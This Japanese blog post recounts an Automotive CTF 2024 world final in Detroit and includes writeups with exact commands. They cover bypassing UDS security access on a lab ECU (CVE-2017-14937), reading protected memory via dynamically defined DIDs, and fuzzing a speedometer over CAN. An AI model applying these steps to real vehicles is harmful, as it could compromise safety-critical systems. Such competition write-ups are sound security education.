---
title: Automotive CTF 2024 世界決勝 - 体験記 & Writeup
id: automotive-ctf-2024-world-final
tags:
  - CTF
  - 自動車セキュリティ
date: 2024-10-24 09:25:00
---

<img src="/img/2024/10-25/head.png" alt="header" width="auto" height="auto">

デトロイトで開催された[Automotive CTF](https://vicone.com/automotive-ctf)の決勝に "TeamOne" チームとして参加し、出場6チーム中 **4位** でした。
（※所属とは無関係に個人活動として参加）

CTFを初めて1年ちょっと、まさか世界で戦う機会に預かれるなんて思ってもみませんでした。良い経験になりました。

[前回の日本決勝の記事](https://laysakura.github.io/2024/09/14/automotive-ctf-2024-japan-final/) と同様に、体験記と自分が解いた問題のwriteupを書きます。実機がないと再現できない問題ばかりなので（出場した方以外は）「ほーん」くらいにお読みください。

<!-- more -->

## 目次
<!-- toc -->

## 体験記

10/26(木)から日本のコンピューターセキュリティシンポジウムに参加するため、他のコンテスト参加者よりも前入り・早帰りでデトロイトに行きました。

ヘンリー・フォード博物館に行ったり、

<img src="/img/2024/10-25/ford.png" alt="ford" width="auto" height="auto">

カナダとの国境にもなっている川に浮かぶベル島という景色最高の島に行ったり、

<img src="/img/2024/10-25/bell.png" alt="bell" width="auto" height="auto">

地元のビール醸造所に行ったりしてました。デトロイトはあんまり観光地という感じではないですが、早朝のベル島は人も少なくめちゃ気に入りました。

10/21(月)の10:00-17:00がコンテスト。日本決勝と同様、[RAMN](https://ramn.readthedocs.io/en/latest/index.html) を使った問題が大半でしたが、他に自動車のスピードメーター（裏側写真だけ...）を使った問題、NFCカードの問題などありました。

<img src="/img/2024/10-25/ic.png" alt="ic" width="auto" height="auto">

問題のボリュームも難易度も国内決勝と比べて体感3倍くらい上がっており、多くの問題が解き切れず... それでもチームで分担したり協力したりで良い戦いができたと思います。

大会後の懇親会では、前年度覇者のpwnalone氏（高レベルなwriteupを拝見して会いたいと思ってた）やRAMN問題の作問者（トヨタの同僚 but 話したの2,3年ぶり）とお話できたりして来てよかった感がありました。

コンテスト中から一貫して順位や他チームのスコアは非公開で、10/25(水)の表彰式で初めて発表されます。日本時間の木曜早朝にチームメンバーからのdiscordメッセージで4位と教えてもらいました。即席チームとしては頑張れたと思うけど微妙に悔しい！

会場は [Newlab](https://www.newlab.com/) という自動車やらハードウェアに関連するスタートアップが利用するイケてる建物（自動車も搬入できる！）で、気持ちよくコンテストに取り組めました。運営の方々、ありがとうございました！！！！

## Writeup

解いた問題の雑writeupです。問題の原文をメモってなく、機械翻訳のものになります...

### RAMNカテゴリ

ECU CのUDS問題を2問解いた。

ECU Cが対応していたUDSサービスは以下。

```bash
% caringcaribou uds services 0x7e2 0x7ea

Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL
Supported service 0x11: ECU_RESET
Supported service 0x22: READ_DATA_BY_IDENTIFIER
Supported service 0x23: READ_MEMORY_BY_ADDRESS
Supported service 0x27: SECURITY_ACCESS
Supported service 0x2c: DYNAMICALLY_DEFINE_DATA_IDENTIFIER
Supported service 0x2e: WRITE_DATA_BY_IDENTIFIER
Supported service 0x3e: TESTER_PRESENT
```

DYNAMICALLY_DEFINE_DATA_IDENTIFIER (0x2c) は初見。

#### [C] CVE-2017-14937

> 0x1111に何かを書き込み、0x0000に何かを読みに行く。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
💡方針

1. [CVE解説論文](https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts)に従ってSecurity Access突破（シードのNOT演算でキーが出るらしい）
2. `% echo "2E 11 11 AB CD" | isotpsend -s 7e2 -d 7ea can0` (DID 0x1111 に適当な値を書く)
3. `% echo "22 00 00" | isotpsend -s 7e2 -d 7ea can0` (DID 0x0000 から読む)

</aside>

```bash
# Diagnostics Session 0x04 に入る
% echo "10 04" | isotpsend -s 7e2 -d 7ea can0

# セキュリティアクセス (レベル5F)
% echo "27 5f" | isotpsend -s 7e2 -d 7ea can0
# => isotpdumpを眺めてると 5A 33 のシードが返却された
 
# 論文に従ってNOT演算
% python -c 'hex(0x5A33 - 0xFFFF)'
# => '-0xa5cc'

# A5 CC をキーとしてセキュリティアクセス突破
% echo "27 60 A5 CC" | isotpsend -s 7e2 -d 7ea can0

# DID 0x1111 に適当な値 (AB CD) を書く
% echo "2E 11 11 AB CD" | isotpsend -s 7e2 -d 7ea can0

# DID 0x0000 から読む
% echo "22 00 00" | isotpsend -s 7e2 -d 7ea can0
# => isotprecv -s 7e2 -d 7ea  can0
# ==> 62 00 00 62 68 7B 53 55 50 33 52 53 30 4E 49 63 7D
# ==> ASCIIデコードすると bh{SUP3RS0NIc}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ bh{SUP3RS0NIc}
</aside>

#### [C] DID not done

> フラグは0x0803e000にある26バイトの文字列だが、Read Memory By Addressがそれを読み込ませてくれない :(

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
💡方針

1. DYNAMICALLY_DEFINE_DATA_IDENTIFIER (0x2c) を使って、どこか適切なDIDを定義し、その値に、アドレスの 0x0803e000 と長さの 26 を指定する
2. READ_DATA_BY_IDENTIFIER (0x22) でそのDIDを読むとフラグ

</aside>

DYNAMICALLY_DEFINE_DATA_IDENTIFIER とかいうサービス、とにかくネットに情報がなく、sub func以下のパラメーターの指定方法が不明。

とりあえずsub funcを総当りしてみる。

```bash
% caringcaribou uds subservices 0x00 0x2c 0x7e2 0x7ea

0x02 : Unknown NRC value
```

ネットを探すと、0x02は "Define by Address" ということでアドレスをDIDに紐づく値にセットできるっぽい？

`isotpdump -s 7e2 -d 7ea -c -a -u can0` しながらガチャガチャ試すと、 `incorrectMessageLengthOrInvalidFormat` エラーが返るケースと `requestOutOfRange` エラーが返るケースがある。後者のほうはアドレス値とかDIDが間違ってると推測でき、望みがあると判断した。

更にガチャガチャし、以下の命令フォーマットであることを突き止める。

```bash
echo "2c 02 XX XX YZ 08 03 e0 00 1A" | isotpsend -s 7e2 -d 7ea can0
```

- `XX XX`: DID
- `Y`: 「長さ」を表現するためのバイト長。本問では **26** を表現したいので、 `Y=1` で良い
- `Z`: 「開始アドレス」を表現するためのバイト長。本問では `Z=4` で良い
- `08 03 e0 00` 問題文で指定された開始アドレス
- `1A`: 問題文で指定された26バイト

ということで

```bash
echo "2c 02 XX XX 14 08 03 e0 00 1A" | isotpsend -s 7e2 -d 7ea can0
```

までは決まるが、 `XX XX` を適当に決めても `requestOutOfRange` エラーのまま。

なんか使えるDIDはないかと、[DIDのマッピング表が載っているページ](https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/) を眺める。

> 0xF300 – 0xF3FF : Dynamically Defined Data Identifier

あった！！！

```bash
echo "2c 02 F3 00 14 08 03 e0 00 1A" | isotpsend -s 7e2 -d 7ea can0
echo "22 F3 00" | isotpsend -s 7e2 -d 7ea can0
```

これで `isotprecv -s 7e2 -d 7ea can0` でASCIIエンコードされたフラグを得る。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ bh{TAKE_THE_LONG_WAY_HOME}
</aside>

### I am Speed カテゴリ

スピードメーターが会場にデデンと置かれている。既に電源とCAN-to-USBデバイスが配線されており、PCにUSB刺して以下のコマンド打つだけでCAN通信ができるようになる。

```bash
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
candump -t a -ac can0
```

---

実は決勝対策でスピードメーターを購入して一通りのCANおしゃべりを試していた。役立った。

[ECU hack - スピードメーター編 (Notion記事)](https://laysakura.notion.site/ECU-hack-127e7f3e990d8022836fd15524b24794)

---

問題文はメモしてないので、うろ覚えの題意を書く。

#### can-utils

> 題意: 速度計を荒ぶらせるコマンドを `bh{ls -al}` のような形式で提出せよ

cangenでファジングする問題。
ほぼ <https://laysakura.notion.site/ECU-hack-127e7f3e990d8022836fd15524b24794#127e7f3e990d80f19a10dfae079758b9> でやった通り。

まずリプレイするデータを作成。

```bash
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

candump vcan0 -l
cangen vcan0 -g 4 -I i -L 8 -D FFFFFFFFFFFFFFFF -n 2048 -v -v

grep "FFFFFFFFFFFF" candump-2024-10-21_1432606.log > candump-FF.log
```

`canplayer` でファジング開始。

```bash
grep "vcan0 0" candump-FF.log | canplayer can0=vcan0
```

速度計やその他のランプ・ビープ音が荒ぶる。

どのCAN IDが速度計に対応するか探す。1桁目が `2` であることはすぐ分かったので、そこから二分探索。

```bash
% grep "vcan0 2" candump-FF.log | canplayer can0=vcan0
% grep "vcan0 2" candump-FF.log |head -n 128 | canplayer can0=vcan0
# ...
% grep "vcan0 2" candump-FF.log |head -n 128 |head -n 64 | head -n 32  | head -n 16 | head -n 8 | head -n 4| tail -n 2 | head -n 1 | canplayer can0=vcan0
```

CAN ID 0x202 が速度計に対応するらしい。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ bh{cangen can0 -I 202}
</aside>

#### Peter Parker

> 題意: パーキング状態かを示すCAN IDを `bh{0x123}` 形式で答えよ

candumpを眺めていると、CAN ID 0x40AでVINらしきものが流れている。VINは `MM7DJ2HAAKW382130` だった。
どこかのサイト（忘れた）でVIN検索すると、マツダ車らしい。

<https://github.com/commaai/opendbc/blob/master/opendbc/dbc/mazda_2017.dbc> のDBCファイルを眺める。
GEARの `552` (10進数) が正解っぽい。16進数だと `0x228` 。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ bh{0x228}
</aside>
